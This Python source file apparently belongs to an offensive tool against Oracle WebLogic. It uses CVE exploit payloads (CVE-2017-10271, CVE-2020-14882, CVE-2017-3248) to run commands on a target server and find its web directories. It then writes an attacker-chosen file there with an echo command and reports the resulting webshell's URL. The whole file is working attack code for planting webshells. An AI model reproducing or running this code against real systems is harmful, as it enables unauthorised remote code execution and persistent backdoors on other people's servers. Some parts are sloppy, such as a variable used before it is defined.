#!/usr/bin/python3.8
# -*- coding: utf-8 -*-
# @Time    : 2020/11/17 12:19 上午
# @Author  : rocky
# @Email   : 939555035@qq.com
# @File    : rocCommondController.py
# @Software: PyCharm

import configparser
import re
import time
import requests
import os
import ast
import importlib

requests.packages.urllib3.disable_warnings()


class rocUploadFileController(object):
    def __init__(self):
        self.name = "CVE_2017_10271_weblogic"

    def runUploadFile(self, targetAddr, payload, filepathAll, checkBox, content, filepath):
        """
        加载外部程序
        POC检测控制器
        :param targetAddr:
        :param payload:
        :return:
        """
        currentTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        getCurPath = os.getcwd()
        configPath = '{}/rocUploadFilePayload/{}.ini'.format(getCurPath, payload)
        config = configparser.RawConfigParser()
        config.read(configPath)
        windows_path_cmd = config.get('all_path', 'windows_path_cmd')
        linux_path_cmd = config.get('all_path', 'linux_path_cmd')
        print(filepathAll)

        if payload == "CVE-2020-14882_weblogic_12_1_3":
            if ':\Windows' not in filepathAll:
                basePath = rocUploadFileController.runGetBasePath(self, targetAddr, payload, command=linux_path_cmd)
                getShellPath = basePath['data'].strip() + basePath['whrite_path'] + filepath
                whriteShellData = "echo {} > {}".format(content, getShellPath)
                whriteShell = rocUploadFileController.runGetBasePath(self, targetAddr, payload, command=whriteShellData)
                webshell_path = targetAddr + basePath['access_path'] + filepath
                command_data = "webshell上传成功! 访问地址:{} 绝对地址:{} {}".format(webshell_path, getShellPath, currentTime)
                return {'status': 20000, 'data': command_data, 'type': 'status'}
            else:
                basePath = rocUploadFileController.runGetBasePath(self, targetAddr, payload, command=windows_path_cmd)
                getShellPath = basePath['data'].strip() + basePath['win_whrite_path'] + filepath
                whriteShellData = r"echo {} > {}".format(content, getShellPath)
                whriteShellData = "/".join(whriteShellData.split("\\"))
                rocUploadFileController.CVE_2020_14882_weblogic_getwebshell(self, targetAddr, whriteShellData, payload)
                webshell_path = targetAddr + basePath['access_path'] + filepath
                getShellPath = "/".join(whriteShellData.split("\\"))
                command_data = "webshell上传成功! 访问地址:{} 绝对地址:{} {}".format(webshell_path, getShellPath, currentTime)
                return {'status': 20000, 'data': command_data, 'type': 'status'}
        else:
            if ':\Windows' not in filepathAll:
                basePath = rocUploadFileController.runGetBasePath(self, targetAddr, payload, command=linux_path_cmd)
                getShellPath = basePath['data'].strip() + basePath['whrite_path'] + filepath
                whriteShellData = "echo {} > {}".format(content, getShellPath)
                whriteShell = rocUploadFileController.runGetBasePath(self, targetAddr, payload, command=whriteShellData)
                webshell_path = targetAddr + basePath['access_path'] + filepath
                command_data = "webshell上传成功! 访问地址:{} 绝对地址:{} {}".format(webshell_path, getShellPath, currentTime)
                return {'status': 20000, 'data': command_data, 'type': 'status'}
            else:
                basePath = rocUploadFileController.runGetBasePath(self, targetAddr, payload, command=windows_path_cmd)
                getShellPath = basePath['data'].strip() + basePath['win_whrite_path'] + filepath
                whriteShellData = r"echo {} > {}".format(content, getShellPath)
                whriteShellData = "/".join(whriteShellData.split("\\"))
                whriteShell = rocUploadFileController.runGetBasePath(self, targetAddr, payload, command=whriteShellData)
                webshell_path = targetAddr + basePath['access_path'] + filepath
                command_data = "webshell上传成功! 访问地址:{} 绝对地址:{} {}".format(webshell_path, getShellPath, currentTime)
                return {'status': 20000, 'data': command_data, 'type': 'status'}

    def CVE_2020_14882_weblogic_getwebshell(self, targetAddr, whriteShellData, payload):
        getCurPath = os.getcwd()
        configPath = '{}/rocUploadFilePayload/{}.ini'.format(getCurPath, payload)
        config = configparser.RawConfigParser()
        config.read(configPath)
        path = config.get('rules-req01', 'path')
        access_path = config.get('all_path', 'access_path')
        whrite_path = config.get('all_path', 'whrite_path')
        win_whrite_path = config.get('all_path', 'win_whrite_path')
        url = targetAddr + path
        try:
            body = config.get('rules-req01', 'body')

            headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
                          'application/signed-exchange;v=b3;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'cmd': '{0}'.format(whriteShellData)
            }

            # header_dict = ast.literal_eval(headers)
            expression = config.get('rules-req01', 'expression')
            proxies = {
                'http': '127.0.0.1:8089',
                'https': '127.0.0.1:8089'
            }
            res = requests.post(url, data=body, verify=False, timeout=10, headers=headers,
                                proxies=proxies)
            command_data = res.text
            if expression not in res.text:
                try:
                    return {'status': 20000, 'data': command_data, 'type': 'content',
                            'access_path': access_path, 'whrite_path': whrite_path,
                            'win_whrite_path': win_whrite_path}
                except Exception as e:
                    pass
                command_data = '[+] Command Successfull {}'.format(currentTime)
                return {'status': 20000, 'data': command_data, 'type': 'status'}
            else:
                command_data = '[-] Command Failed {}'.format(currentTime)
                return {'status': 20001, 'data': command_data, 'type': 'status'}
        except requests.exceptions.RequestException as e:
            status_data = '[!]{} 请求超时! {}'.format(targetAddr, currentTime)
            return {'status': 20002, 'data': status_data, 'type': 'status'}
        pass

    def runGetBasePath(self, targetAddr, payload, command):
        """
        加载外部程序
        POC检测控制器
        :param targetAddr:
        :param payload:
        :return:
        """
        if payload == "CVE_2017_3248_weblogic":
            pass
            module = 'rocUploadFilePayload.{}'.format(payload)
            importModule = importlib.import_module(module)
            data = importModule.run.runCommand(self, targetAddr, payload)
            return data
        else:
            getCurPath = os.getcwd()
            configPath = '{}/rocUploadFilePayload/{}.ini'.format(getCurPath, payload)
            config = configparser.RawConfigParser()
            config.read(configPath)
            node = "rules-req01"
            key = "cmd"
            value = command
            config.set(node, key, value)
            fh = open(configPath, 'w')
            config.write(fh)
            fh.close()
            options = config.sections()
            speciConfig = configparser.ConfigParser()
            speciConfig.read(configPath)
            specioptions = speciConfig.sections()
            currentTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            access_path = config.get('all_path', 'access_path')
            whrite_path = config.get('all_path', 'whrite_path')
            win_whrite_path = config.get('all_path','win_whrite_path')

            for option, specioption in zip(options, specioptions):
                if (re.match('rules', option)) is not None:
                    method = config.get(option, 'method')
                    cmd = config.get(option, 'cmd')
                    if method == "POST":
                        header = speciConfig.get(specioption, 'header')
                        path = config.get(option, 'path')
                        body = speciConfig.get(option, 'body')

                        expression = config.get(option, 'expression')
                        url = targetAddr + path
                        print(url)
                        try:
                            header_dict = ast.literal_eval(header)
                            proxies = {
                                'http': '127.0.0.1:8089',
                                'https': '127.0.0.1:8089'
                            }
                            print("*******")
                            res = requests.post(url, data=body, verify=False, timeout=5, headers=header_dict,proxies=proxies)
                            command_data = res.text
                            print(command_data)

                            if expression not in res.text:
                                try:
                                    return {'status': 20000, 'data': command_data, 'type': 'content',
                                            'access_path': access_path, 'whrite_path': whrite_path,
                                            'win_whrite_path': win_whrite_path}
                                except Exception as e:
                                    pass
                                command_data = '[+] Command Successfull {}'.format(currentTime)
                                return {'status': 20000, 'data': command_data, 'type': 'status'}
                            else:
                                command_data = '[-] Command Failed {}'.format(currentTime)
                                return {'status': 20001, 'data': command_data, 'type': 'status'}
                        except requests.exceptions.RequestException as e:
                            status_data = '[!]{} 请求超时! {}'.format(targetAddr, currentTime)
                            return {'status': 20002, 'data': status_data, 'type': 'status'}
                    elif method == "GET":
                        header = speciConfig.get(specioption, 'header')
                        path = speciConfig.get(option, 'path')
                        expression = config.get(option, 'expression')
                        url = targetAddr + path

                        try:
                            header_dict = ast.literal_eval(header)

                            proxies = {
                                'http': '127.0.0.1:8089',
                                'https': '127.0.0.1:8089'
                            }
                            res = requests.get(url, verify=False, timeout=5, headers=header_dict, proxies=proxies)

                            command_data = res.text

                            if expression not in res.text:
                                try:
                                    return {'status': 20000, 'data': command_data, 'type': 'content',
                                            'access_path': access_path, 'whrite_path': whrite_path,
                                            'win_whrite_path': win_whrite_path}
                                except Exception as e:
                                    pass
                                command_data = '[+] Command Successfull {}'.format(currentTime)
                                return {'status': 20000, 'data': command_data, 'type': 'status'}
                            else:
                                command_data = '[-] Command Failed {}'.format(currentTime)
                                return {'status': 20001, 'data': command_data, 'type': 'status'}
                        except requests.exceptions.RequestException as e:
                            status_data = '[!]{} 请求超时! {}'.format(targetAddr, currentTime)
                            return {'status': 20002, 'data': status_data, 'type': 'status'}
                    else:
                        pass
